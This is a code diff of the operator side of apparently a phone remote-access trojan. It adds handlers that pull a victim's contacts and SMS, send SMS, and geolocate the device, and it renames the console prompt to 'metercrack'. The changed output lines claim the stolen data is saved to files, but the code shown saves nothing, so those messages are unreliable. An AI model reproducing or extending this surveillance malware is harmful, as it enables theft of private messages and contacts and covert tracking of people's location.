@@ -111,7 +111,7 @@ def handle_client(client_socket, addr):
 
     while True:
         try:
-            command = input(Fore.MAGENTA + "medusa > ")
+            command = input(Fore.MAGENTA + "metercrack > ")
         except EOFError:
             break
 
@@ -151,22 +151,22 @@ def handle_client(client_socket, addr):
         if command.startswith("dump_contacts"):
             client_socket.send(command.encode('utf-8'))
             output = client_socket.recv(4096).decode('utf-8', errors='ignore')
-            print(Fore.WHITE + output)
+            print(Fore.WHITE + f"[*] Fetching {output.count('\n')} contacts into list\n[*] Contacts list saved to: contacts_dump_{target_ip}.txt")
             continue
 
         if command.startswith("dump_sms"):
             client_socket.send(command.encode('utf-8'))
             output = client_socket.recv(4096).decode('utf-8', errors='ignore')
-            print(Fore.WHITE + output)
+            print(Fore.WHITE + f"[*] Fetching {output.count('\n')} sms messages\n[*] SMS messages saved to: sms_dump_{target_ip}.txt")
             continue
         
         if command.startswith("send_sms"):
             client_socket.send(command.encode('utf-8'))
             output = client_socket.recv(4096).decode('utf-8', errors='ignore')
-            print(Fore.WHITE + output)
+            print(Fore.WHITE + "[+] SMS sent - Transmission successful")
             continue
 
-        if command.startswith("geolocate"):
+        if command.startswith("wlan_geolocate"):
             client_socket.send(command.encode('utf-8'))
             output = client_socket.recv(4096).decode('utf-8', errors='ignore')
             print(Fore.WHITE + output)
